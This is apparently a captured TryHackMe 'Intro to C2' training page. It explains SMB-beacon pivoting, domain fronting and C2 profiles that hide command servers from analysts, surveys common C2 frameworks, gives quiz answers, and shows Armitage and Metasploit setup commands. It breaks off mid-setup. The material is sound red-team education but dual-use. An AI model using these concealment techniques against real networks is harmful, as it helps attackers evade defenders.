</b></span><p><span>One of the last major components of a <a class="j9oDSlYM glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;j9oDSlYM&#39;)">C2</a> Framework is its pivoting modules, making it easier to access restricted network segments within the C2 Framework. If you have Administrative Access on a system, you may be able to open up an “SMB Beacon”, which can enable a machine to act as a proxy via the SMB protocol. This may allow machines in a restricted network segment to communicate with your C2 server.</span></p><span style="font-size:16px">
</span><p style="text-align:center"><img src="./TryHackMe _ Intro to C2_files/da7b0247ff1db8e98c9358c39a0c3d21.png"><br></p><p style="text-align:center"><i><span>This diagram depicts multiple victims with an <a class="2iojzg0o glossary-term" onclick="initPopOver(&#39;SMB&#39;, &#39;2iojzg0o&#39;)">SMB</a> pivot calling back to a C2 server.</span></i></p><h3><div style="font-size:16px"><span>The diagram above shows how hosts within a restricted network segment call back to the <a class="SQmiJCRs glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;SQmiJCRs&#39;)">C2</a> Server:</span></div><div style="font-size:16px"><br></div><div style="font-size:16px"><span style="font-size:1rem"><span style="font-weight:bolder">1.</span><span>&nbsp;The Victims call back to an <a class="gxdWvz7b glossary-term" onclick="initPopOver(&#39;SMB&#39;, &#39;gxdWvz7b&#39;)">SMB</a> named pipe on another Victim in a non-restricted network segment.</span></span><br></div><div style="font-size:16px"><span style="font-weight:bolder">2.</span><span>&nbsp;The Victim in the non-restricted network segment calls back to the <a class="QS1rezQy glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;QS1rezQy&#39;)">C2</a> Server over a standard beacon.</span></div><div style="font-size:16px"><span style="font-weight:bolder">3.</span><span>&nbsp;The <a class="6d3tsmd6 glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;6d3tsmd6&#39;)">C2</a> Server then sends commands back to the Victim in the non-restricted network segment.</span></div><div style="font-size:16px"><span style="font-weight:bolder">4.&nbsp;</span><span>The Victim in the non-restricted network segment then forwards the <a class="WaBLgYZm glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;WaBLgYZm&#39;)">C2</a> instructions to the hosts in the restricted segment.</span></div><div style="font-size:16px"><br></div><p style="font-size:16px"></p><span style="font-size:16px"></span></h3><h3>Facing the world&nbsp;</h3><p style="text-align:left">One important obstacle that all Red Teamers must overcome is placing infrastructure in plain view. There are many different methods to do this; one of the most popular methods is called "Domain Fronting". </p><p style="text-align:left"><b>Domain Fronting</b></p><p style="text-align:left"><span>Domain Fronting utilizes a known, good host (for example) Cloudflare. Cloudflare runs a business that provides enhanced metrics on <a class="mreTUs9c glossary-term" onclick="initPopOver(&#39;HTTP&#39;, &#39;mreTUs9c&#39;)">HTTP</a> connection details as well as caching HTTP connection requests to save bandwidth.&nbsp; Red Teamers can abuse this to make it appear that a workstation or server is communicating with a known, trusted IP Address. Geolocation results will show wherever the nearest Cloudflare server is, and the IP Address will show as ownership to Cloudflare.</span></p><p style="text-align:center"><img src="./TryHackMe _ Intro to C2_files/cd1ea19e9e0d7bef0d8ec6615061335b.png"><br></p><p style="text-align:center"><i><span>This diagram shows an example <a class="5j0ftk2G glossary-term" onclick="initPopOver(&#39;HTTP&#39;, &#39;5j0ftk2G&#39;)">HTTP</a> beacon from a compromised device.</span></i></p><h3><div style="font-size:16px"><div>The diagram above depicts how Domain Fronting works:</div><div><br></div><div><span style="font-size:1rem"><span style="font-weight:bolder">1.</span><span>&nbsp;The <a class="g2Rt5jVG glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;g2Rt5jVG&#39;)">C2</a> Operator has a domain that proxies all requests through Cloudflare.&nbsp;</span></span><br></div><div><span style="font-weight:bolder">2.</span><span>&nbsp;The Victim beacons out to the <a class="b4YpEZKQ glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;b4YpEZKQ&#39;)">C2</a> Domain.</span></div><div><span style="font-weight:bolder">3.</span>&nbsp;Cloudflare proxies the request, then looks at the Host header and relays the traffic to the correct server.</div><div><span style="font-weight:bolder">4. </span><span>The <a class="wlz1DZer glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;wlz1DZer&#39;)">C2</a> Server then responds to Cloudflare with the C2 Commands.</span></div><div><b>5. </b>The Victim then receives the command from Cloudflare.</div><div><br></div></div></h3><p><b><span><a class="grisMgyN glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;grisMgyN&#39;)">C2</a> Profiles</span></b></p><p><span>The next technique goes by several names by several different products, "NGINX Reverse Proxy", "Apache Mod_Proxy/Mod_Rewrite",&nbsp; "Malleable <a class="VY5dHJrd glossary-term" onclick="initPopOver(&#39;HTTP&#39;, &#39;VY5dHJrd&#39;)">HTTP</a> C2 Profiles", and many others. However, they are all more or less the same. All of the Proxy features more or less allow a user to control specific elements of the incoming HTTP request. Let's say an incoming connection request has an "X-C2-Server" header; we could explicitly extract this header using the specific technology that is at your disposal (Reverse Proxy, Mod_Proxy/Rewrite, Malleable C2 Profile, etc.) and ensure that your C2 server responds with C2 based responses. Whereas if a normal user queried the HTTP Server, they might see a generic webpage. This is all dependent on your configuration.</span></p><p style="text-align:center"><img src="./TryHackMe _ Intro to C2_files/22eac0e3ab2de3f61d57e858cee3e33e.png" style="width:1053.47px;height:541.021px"><br></p><p style="text-align:center"><i><span style="font-size:14px"><span>A Compromised Device and Security Analyst reach out to a <a class="1AbNm2yA glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;1AbNm2yA&#39;)">C2</a> server, only the Compromised device gets a C2 Beacon back - the Analyst gets Cloudflare's website back.</span></span></i></p><p><span style="font-size:14px"> </span></p><div><span>The diagram above depicts how <a class="nrhy45vp glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;nrhy45vp&#39;)">C2</a> profiles work:</span></div><div><br></div><div><span style="font-size:1rem"><span style="font-weight:bolder">1.</span><span>&nbsp;The Victim beacons out to the <a class="MlNwXsBb glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;MlNwXsBb&#39;)">C2</a> Server with a custom header in the HTTP request, while a SOC Analyst has a normal HTTP Request</span></span><br></div><div><span style="font-weight:bolder">2.</span>&nbsp;The requests are proxied through Cloudflare</div><div><span style="font-weight:bolder">3.</span><span>&nbsp;The <a class="aI9PblSl glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;aI9PblSl&#39;)">C2</a> Server receives the request and looks for the custom header, and then evaluates how to respond based on the C2 Profile.</span></div><div><b>4. </b><span>The <a class="NFZFh7ih glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;NFZFh7ih&#39;)">C2</a> Server responds to the client and responds to the Analyst/Compromised device.</span></div><div><br></div><p style="text-align:left"><span>Because HTTPS requests are encrypted, extracting specific headers (ex: X-<a class="nDqGoWqv glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;nDqGoWqv&#39;)">C2</a>-Server, or Host) may be impossible. By using C2 Profiles, we may be able to hide our C2 server from the prying eyes of a Security Analyst. For more information on how C2 profiles can be powerful, see this blog post on </span><a href="https://blog.zsec.uk/cobalt-strike-profiles/" target="_blank">Understanding Malleable C2 Profiles for Cobalt Strike</a>.</p><p style="text-align:left"><span>In task 7, we will explain and explore another technique called "Redirectors". We will gain hands-on experience configuring Metasploit and <a class="QBnS7Frx glossary-term" onclick="initPopOver(&#39;Apache&#39;, &#39;QBnS7Frx&#39;)">Apache</a> 2 to demonstrate how a redirector is set up.</span></p></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details"><span>
                                What is the name of the program that lives on the victim machine that calls back to the C2 server?
                            </span></div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: *****" value="Agent" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="2">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Correct Answer
                        </button>
                        </div>
                        
                    </div><div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                <p>What is the beaconing option that introduces a random delay value to the sleep timer?</p>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ******" value="Jitter" disabled="">
                            <input type="hidden" value="2">
                            <input type="hidden" value="2">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Correct Answer
                        </button>
                        </div>
                        
                    </div><div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                <p>What is the term for the first portion of a Staged payload?</p>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: *******" value="Dropper" disabled="">
                            <input type="hidden" value="3">
                            <input type="hidden" value="2">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Correct Answer
                        </button>
                        </div>
                        
                    </div><div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                <p><span>What is the name of the communication method that can potentially allow access to a restricted network segment that communicates via <a class="grh6wmTx glossary-term" onclick="initPopOver(&#39;TCP&#39;, &#39;grh6wmTx&#39;)">TCP</a> ports 139 and 445?</span></p>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: *** ******" value="SMB Beacon" disabled="">
                            <input type="hidden" value="4">
                            <input type="hidden" value="2">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Correct Answer
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-3">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse3">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 3                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> Common C2 Frameworks
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse3" class="collapse show" data-parent="#taskContent">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <h3><span style="font-size:1.75rem"><span>Common <a class="rVGN0Iwo glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;rVGN0Iwo&#39;)">C2</a> Frameworks</span></span><br></h3>
<p><span>Throughout your journey, you may encounter many different <a class="4s0UuZzv glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;4s0UuZzv&#39;)">C2</a> Frameworks; we will discuss a few popular C2 Frameworks that are widely used by Red Teamers and Adversaries alike.  We will be dividing this into two sections:</span></p>
<ul>
<li>Free</li>
<li>Premium/Paid</li>
</ul>
<p><span>You may ask some questions like “Why would I use a premium or paid <a class="hb5lt0tB glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;hb5lt0tB&#39;)">C2</a> framework?”, and this is an excellent question. Premium/Paid C2 frameworks usually are less likely to be detected by Anti-Virus vendors. This is not to say that it's impossible to be detected, just that open-source C2 projects are generally well understood, and signatures can be easily be developed.</span></p>
<p><span>Usually, premium <a class="e5EkAj12 glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;e5EkAj12&#39;)">C2</a> frameworks generally have more advanced post-exploitation modules, pivoting features, and even feature requests that open-source software developers may sometimes not fulfill. For example, one feature Cobalt Strike offers that most other C2 frameworks do not is the ability to open a VPN tunnel from a beacon. This can be a fantastic feature if a Proxy does not work well in your specific situation. You must do your research to find out what will work best for your team.</span></p><p><br></p>
<h3><span>Free <a class="ve4jC7C8 glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;ve4jC7C8&#39;)">C2</a> Frameworks</span></h3>
<p><strong>Metasploit</strong></p>
<p>The <a href="https://www.metasploit.com/">Metasploit Framework</a><span>, developed and maintained by Rapid7, is one of the most popular Exploitation and Post Exploitation frameworks (<a class="CV89jHmU glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;CV89jHmU&#39;)">C2</a>) that is publicly available and is installed on most penetration testing distributions.</span></p><p><strong>
</strong></p><div class="terminal-container"><strong>
    <div class="terminal-content">
        <div class="terminal-top">
            MSFConsole
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0">           <code class=" language-shell-session"><span class="token command"><span class="token info punctuation"><span class="token user">root@kali</span></span><span class="token shell-symbol important">$</span> <span class="token bash language-bash">msfconsole</span></span>
<span class="token output">                                                  

      .:okOOOkdc'           'cdkOOOko:.
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
  oOOOOOOOO.    .oOOOOoOOOOl.    ,OOOOOOOOo
  dOOOOOOOO.      .cOOOOOc.      ,OOOOOOOOx
  lOOOOOOOO.         ;d;         ,OOOOOOOOl
  .OOOOOOOO.   .;           ;    ,OOOOOOOO.
   cOOOOOOO.   .OOc.     'oOO.   ,OOOOOOOc
    oOOOOOO.   .OOOO.   :OOOO.   ,OOOOOOo
     lOOOOO.   .OOOO.   :OOOO.   ,OOOOOl
      ;OOOO'   .OOOO.   :OOOO.   ;OOOO;
       .dOOo   .OOOOocccxOOOO.   xOOd.
         ,kOl  .OOOOOOOOOOOOO. .dOk,
           :kk;.OOOOOOOOOOOOO.cOk:
             ;kOOOOOOOOOOOOOOOk:
               ,xOOOOOOOOOOOx,
                 .lOOOOOOOl.
                    ,dOd,
                      .

       =[ metasploit v6.1.12-dev                          ]
+ -- --=[ 2177 exploits - 1152 auxiliary - 399 post       ]
+ -- --=[ 596 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: View a module's description using 
info, or the enhanced version in your browser with 
info -d

msf6 &gt; </span></code>
        </pre>
    </div>
</strong></div><strong>
</strong><p></p><p><strong><br></strong></p><p><strong>Armitage</strong><br></p>
<p><a href="https://web.archive.org/web/20211006153158/http://www.fastandeasyhacking.com/">Armitage</a>&nbsp;is an extension of the Metasploit Framework - it adds a Graphical user interface and is written in Java, and is incredibly similar to Cobalt Strike. This is because they were both developed by Raphael Mudge. Armitage offers an easy way to enumerate and visualize all of your targets. Aside from looking a lot like Cobalt Strike, it even offers some unique features. One of the most popular can be found in the “Attacks” menu; This feature is known as the Hail Mary attack, which attempts to run all exploits for the services running on a specific workstation. Armitage really is “Fast and Easy Hacking”.</p>
<p style="text-align:center"><img src="./TryHackMe _ Intro to C2_files/6fc808991c2ea5a5faae2a271f9bf907.png" style="width:1077.25px;height:504px"></p><p style="text-align:center"><i>A Screenshot of the Armitage UI</i></p><p style="text-align:center"><br></p><p><strong>Powershell Empire/Starkiller</strong></p>
<p><a href="https://bc-security.gitbook.io/empire-wiki/">Powershell Empire</a> and <a href="https://github.com/BC-SECURITY/Starkiller">Starkiller</a><span> is another incredibly popular <a class="zI0bgizR glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;zI0bgizR&#39;)">C2</a> originally created by Harmjoy, Sixdub, and Enigma0x3 from Veris Group. Currently, the project has been discontinued and has been picked up by the BC Security team (Cx01N, Hubbl3, and _Vinnybod). Empire features agents written in various languages compatible with multiple platforms, making it an incredibly versatile C2. For more information on Empire, we recommend you take a look at the </span><a href="https://tryhackme.com/room/rppsempire">Powershell Empire</a> room.</p><p style="text-align:center"><img src="./TryHackMe _ Intro to C2_files/7605d1d88a01604402dcde1878a8acd0.png" style="width:1065.33px;height:521.101px"><br></p><p style="text-align:center"><i>A Screenshot of the Starkiller UI</i></p><p style="text-align:left"><strong>Covenant</strong></p>
<p><a href="https://github.com/cobbr/Covenant">Covenant</a><span> by Ryan Cobb is the last free <a class="Clqrolzx glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;Clqrolzx&#39;)">C2</a> Framework we will be covering - By far, it is one of the most unique C2 Frameworks being written in C#. Unlike Metasploit/Armitage, It’s primarily used for post-exploitation and lateral movement with HTTP, HTTPS, and SMB listeners with highly customizable&nbsp;</span><span style="font-size:1rem">agents</span><span style="font-size:1rem">.</span></p>
<p style="text-align:center"><img src="./TryHackMe _ Intro to C2_files/55f84861830c1bc50d2b251bda883019.PNG" style="width:1088.33px;height:494.375px"></p><p style="text-align:center"><i>A Screenshot of the Covenant UI</i></p>
<h3><p style="font-size:16px"><span style="font-weight:bolder">Sliver</span></p><div><p style="font-size:16px"><a href="https://github.com/BishopFox/sliver" target="_blank">Sliver </a>by <a href="https://bishopfox.com/" target="_blank">Bishop Fox</a><span> is an advanced, highly customizable multi-user, CLI-based <a class="8nehtIfd glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;8nehtIfd&#39;)">C2</a> framework. Sliver is written in Go, which makes reverse engineering the C2 "implants" incredibly difficult. It supports various protocols for C2 communications like WireGuard, mTLS, HTTP(S), DNS, and much more. Additionally, it supports BOF files for additional functionality, DNS Canary Domains for masking C2 communications, automatic Let's Encrypt certificate generation for HTTPS beacons, and much more.&nbsp;&nbsp;</span></p></div><div style="text-align:center"><img src="./TryHackMe _ Intro to C2_files/9447257966d025c8927541a7adab9113.png" style="width:714.032px;height:603.639px"><span style="font-weight:bolder"><br></span></div><div style="text-align:center"><span style="font-size:16px">﻿<i>A Screenshot of the Sliver UI</i></span><br></div></h3><h3><span>Paid <a class="RP32ChxN glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;RP32ChxN&#39;)">C2</a> Frameworks</span></h3>
<p><strong>Cobalt Strike</strong><br></p>
<p><a href="https://www.cobaltstrike.com/">Cobalt Strike</a> by Help Systems (Formerly created by Raphael Mudge) is arguably one of the most famous Command and Control frameworks next to Metasploit. Much like Artimage, it is written in Java and designed to be as flexible as possible.  For more information, see Cobalt Strike’s <a href="https://www.youtube.com/playlist?list=PLcjpg2ik7YT6H5l9Jx-1ooRYpfvznAInJ">Video Training Page</a>. It offers additional insight into both Red Team Operations and the Framework by Raphael Mudge himself.</p>
<p style="text-align:center"><img src="./TryHackMe _ Intro to C2_files/573e8581dd1be594cf674cbf06271cde.png" style="width:1078.33px;height:591.596px"></p><p style="text-align:center"><i>A screenshot of the Cobalt Strike UI</i></p><p><strong>Brute Ratel</strong></p>
<p><a href="https://bruteratel.com/">Brute Ratel</a><span> by Chetan Nayak or Paranoid Ninja&nbsp;is a Command and Control framework marketed as a “Customizable Command and Control Center” or “C4” framework that provides a true adversary simulation-like experience with being a unique <a class="aqSFuhTj glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;aqSFuhTj&#39;)">C2</a> framework. For more information about the Framework, the author has provided a </span><a href="https://bruteratel.com/tabs/tutorials/">Video Training Page</a> that demonstrates many of the capabilities within the framework.</p>
<p><img src="./TryHackMe _ Intro to C2_files/4afab434ea1d36584a5f7d0d7b8c2ad1.jpeg" style="width:1085.23px;height:576.527px"></p><p style="text-align:center"><i>Screenshot of the Brute Ratel UI - Source:&nbsp;</i><a href="https://bruteratel.com/" target="_blank">https://bruteratel.com/</a><a href="https://bruteratel.com/" target="_blank"></a></p><h3><span>Other <a class="KywSFKwd glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;KywSFKwd&#39;)">C2</a> Frameworks</span></h3><p style="text-align:center">
</p><p><span>For a more comprehensive list of <a class="JOumi4lY glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;JOumi4lY&#39;)">C2</a> Frameworks and their capabilities, check out the “</span><a href="https://howto.thec2matrix.com/">C2 Matrix</a>”, a project maintained by <strong>Jorge Orchilles</strong> and <strong>Bryson Bort</strong><span>. It has a far more comprehensive list of almost all <a class="jaiB79ob glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;jaiB79ob&#39;)">C2</a> Frameworks that are currently available. We highly recommend that after this room, you go check it out and explore some of the other C2 Frameworks that were not discussed in this room.&nbsp;</span></p></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details"><span>
                                Learn about some common C2 Frameworks that are out in the wild!
                            </span></div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="No answer needed" value="" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="3">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Question Done
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-4">
                    <div class="card-header task-header collapsed" data-toggle="collapse" href="#collapse4" aria-expanded="false">
                        <a class="card-link">
                            <span class="task-dropdown-title red">Task 4                             <span class="task-dropdown-icon"><i class="far fa-circle text-lgray"></i></span></span> Setting Up a C2 Framework 
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse4" class="collapse show" data-parent="#taskContent" style="">
                        <div class="card-body task-incomplete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <h3><span>Let's Setup a <a class="aFb33QLT glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;aFb33QLT&#39;)">C2</a> Server</span></h3><div><span>In order to gain a better understanding of what is required to set up and administer a <a class="f2LpheXU glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;f2LpheXU&#39;)">C2</a> server, we will be using Armitage. As a reminder, Armitage is a GUI for the Metasploit Framework, and because of this, it has almost all aspects of a standard C2 framework.</span></div><div><br></div><div><i>Note: In case you're using the AttackBox, you may skip to the Preparing our Environment section.</i></div><div><br></div><div><h3>Setting Up Armitage</h3><p><b>Downloading, Building, and Installing Armitage</b></p></div><div>First, we must clone the repository from Gitlab:</div><div><br></div><div>
<div class="terminal-container"><strong>
    <div class="terminal-content">
        <div class="terminal-top">
            Installing Armitage
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0">           <code class=" language-shell-session"><span class="token command"><span class="token info punctuation"><span class="token user">root@kali</span></span><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">git</span> clone https://gitlab.com/kalilinux/packages/armitage.git <span class="token operator">&amp;&amp;</span> <span class="token builtin class-name">cd</span> armitage</span></span>
<span class="token output">Cloning into 'armitage'...
remote: Enumerating objects: 760, done.
remote: Counting objects: 100% (160/160), done.
remote: Compressing objects: 100% (100/100), done.
remote: Total 760 (delta 55), reused 152 (delta 54), pack-reused 600
Receiving objects: 100% (760/760), 11.81 MiB | 8.55 MiB/s, done.
Resolving deltas: 100% (244/244), done.
</span></code>
        </pre>
    </div>
</strong></div>
</div><div>Next up, we must build the current release; we can do so with the following command:</div><div><br></div><div>

<div class="terminal-container"><strong>
    <div class="terminal-content">
        <div class="terminal-top">
            Building Armitage
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0">           <code class=" language-shell-session"><span class="token command"><span class="token info punctuation"><span class="token user">root@kali</span></span><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">bash</span> package.sh</span></span>
<span class="token output"><span>+ ./gradlew assemble

&gt; Task :armitage:compileJava
Note: Some input files use or override a deprecated API.
Note: Recompile with -Xlint:deprecation for details.
Note: Some input files use unchecked or unsafe operations.
Note: Recompile with -Xlint:unchecked for details.

Deprecated Gradle features were used in this build, making it incompatible with Gradle 7.0.
Use '--warning-mode all' to show the individual deprecation warnings.
See https://docs.gradle.org/6.8/userguide/command_line_interface.html#sec:command_line_warnings

BUILD SUCCESSFUL in 12s
6 actionable tasks: 6 executed
+ for i in unix windows mac
+ '[' unix == mac ']'
+ mkdir -p release/unix
+ cp build.txt license.txt readme.txt whatsnew.txt release/unix
+ cp build/armitage.jar build/cortana.jar release/unix
+ cp -r dist/unix/armitage dist/unix/armitage-logo.png dist/unix/teamserver release/unix
+ '[' unix == mac ']'
+ for i in unix windows mac
+ '[' windows == mac ']'
+ mkdir -p release/windows
+ cp build.txt license.txt readme.txt whatsnew.txt release/windows
+ cp build/armitage.jar build/cortana.jar release/windows
+ cp -r dist/windows/armitage.exe release/windows
+ '[' windows == mac ']'
+ for i in unix windows mac
+ '[' mac == mac ']'
++ uname
+ '[' Linux '!=' Darwin ']'
+ echo 'Skipping macOS build because this is not running on Darwin'
Skipping macOS build because this is not running on Darwin
</span></span></code>
        </pre>
    </div>

</strong></div><div><strong><br></strong></div><div>After the building process finishes, the release build will be in the ./releases/unix/ folder.&nbsp; You should check and verify that Armitage was able to be built successfully.</div><div><br></div><div><div class="terminal-container"><span style="font-weight:normal">
    </span><div class="terminal-content" style="font-weight:bold">
        <div class="terminal-top">
            Verifying Build
        </div>
        <pre class="terminal-code language-shell-session" style="font-weight:bold" tabindex="0">           <code class=" language-shell-session"><span class="token command"><span class="token info punctuation"><span class="token user">root@kali</span></span><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token builtin class-name">cd</span> ./release/unix/ <span class="token operator">&amp;&amp;</span> <span class="token function">ls</span> -la</span></span>
<span class="token output">total 11000
drwxr-xr-x 2 root root    4096 Feb  6 20:20 .
drwxr-xr-x 4 root root    4096 Feb  6 20:20 ..
-rwxr-xr-x 1 root root      75 Feb  6 20:20 armitage
-rw-r--r-- 1 root root 4334705 Feb  6 20:20 armitage.jar
-rw-r--r-- 1 root root   25985 Feb  6 20:20 armitage-logo.png
-rw-r--r-- 1 root root     282 Feb  6 20:20 build.txt
-rw-r--r-- 1 root root 6778470 Feb  6 20:20 cortana.jar
-rw-r--r-- 1 root root    1491 Feb  6 20:20 license.txt
-rw-r--r-- 1 root root    4385 Feb  6 20:20 readme.txt
-rwxr-xr-x 1 root root    2665 Feb  6 20:20 teamserver
-rw-r--r-- 1 root root   85945 Feb  6 20:20 whatsnew.txt
</span></code>
        </pre></div></div><div class="terminal-container"><span style="font-size:1rem">In this folder, there are two key files that we will be using:</span></div><div class="terminal-container"><span style="font-size:1rem"><br></span></div><div class="terminal-container"><span style="font-size:1rem"><b>Teamserver -</b></span></div><p>This is the file that will start the Armitage server that multiple users will be able to connect to. This file takes two arguments:</p><ul><li><span style="font-size:1rem"><p>IP Address</p></span></li></ul><p>Your fellow Red Team Operators will use the IP Address<span style="font-size:1rem">&nbsp;to connect to your Armitage server.</span><br></p><ul><li>&nbsp;Shared Password</li></ul><p>Your fellow Red Team Operators will use the Shared Password<span style="font-size:1rem">&nbsp;to access your Armitage server.</span><br></p><p><b style="font-size:1rem">Armitage -</b><br>This is the file you will be using to connect to the Armitage Teamserver. Upon executing the binary, a new prompt will open up, displaying connection information and your username (this should be treated as a nickname, not a username for authentication) and password.</p><p style="text-align:center"><img src="./TryHackMe _ Intro to C2_files/628edce404a27f170a34d3a9d9464d1c.png"><b><br></b></p><p style="text-align:center"><i>Armitage's Connection Info GUI</i></p><h3>Preparing our Environment</h3><p>Before we can launch Armitage, we must do a few pre-flight checks to ensure Metasploit is configured properly. Armitage relies heavily on Metasploit's Database functionality, so we must start and initialize the database before launching Armitage. In order to do so, we must execute the following commands:</p></div></div>
<div><div class="terminal-container"><span style="font-weight:normal">
    </span><div class="terminal-content" style="font-weight:bold">
        <div class="terminal-top">
            Starting PostgreSQL</div>
        <pre class="terminal-code language-shell-session" style="font-weight:bold" tabindex="0">           <code class=" language-shell-session"><span class="token command"><span class="token info punctuation"><span class="token user">root@kali</span></span><span class="token shell-symbol important">$</span> <span class="token bash language-bash">systemctl start postgresql <span class="token operator">&amp;&amp;</span> systemctl status postgresql</span></span>
<span class="token output">postgresql.service - PostgreSQL RDBMS
   Loaded: loaded (/lib/systemd/system/postgresql.service; enabled; vendor preset: enabled)
   Active: active (exited) since Sun 2022-02-06 20:16:03 GMT; 41min ago
  Process: 1587 ExecStart=/bin/true (code=exited, status=0/SUCCESS)
 Main PID: 1587 (code=exited, status=0/SUCCESS)

Feb 06 20:16:03 ip-10-10-142-239 systemd[1]: Starting PostgreSQL RDBMS...
Feb 06 20:16:03 ip-10-10-142-239 systemd[1]: Started PostgreSQL RDBMS.
</span></code>
        </pre></div></div>
</div><div><br></div><div>Lastly, we must initialize the Database so that Metasploit can use it. It's important to note that you <b>cannot </b>be the root user when attempting to initialize the Metasploit Database. On the <b>AttackBox,</b>&nbsp;you must use the <b>Ubuntu </b>user.</div><div><br></div><div>
<div class="terminal-content">
        <div class="terminal-top" style="font-weight:bold">
            Initializing PostgreSQL Database</div>
        <pre class="terminal-code language-shell-session" style="font-weight:bold" tabindex="0">           <code class=" language-shell-session"><span class="token command"><span class="token info punctuation"><span class="token user">user@kali</span></span><span class="token shell-symbol important">$</span> <span class="token bash language-bash">msfdb --use-defaults delete</span></span>
<span class="token output">Stopping database at /home/ubuntu/.msf4/db
Deleting all data at /home/ubuntu/.msf4/db
MSF web service is no longer running

</span><span class="token command"><span class="token info punctuation"><span class="token user">user@kali</span></span><span class="token shell-symbol important">$</span> <span class="token bash language-bash">msfdb --use-defaults init</span></span>
<span class="token output">Creating database at /home/ubuntu/.msf4/db
Starting database at /home/ubuntu/.msf4/db...success
Creating database users
Writing client authentication configuration file /home/ubuntu/.msf4/db/pg_hba.conf
Stopping database at /home/ubuntu/.msf4/db
Starting database at /home/ubuntu/.msf4/db...success
Creating initial database schema
Generating SSL key and certificate for MSF web service
Attempting to start MSF web service...failed
[!] MSF web service does not appear to be started.
Please see /home/ubuntu/.msf4/logs/msf-ws.log for additional details.
</span></code>
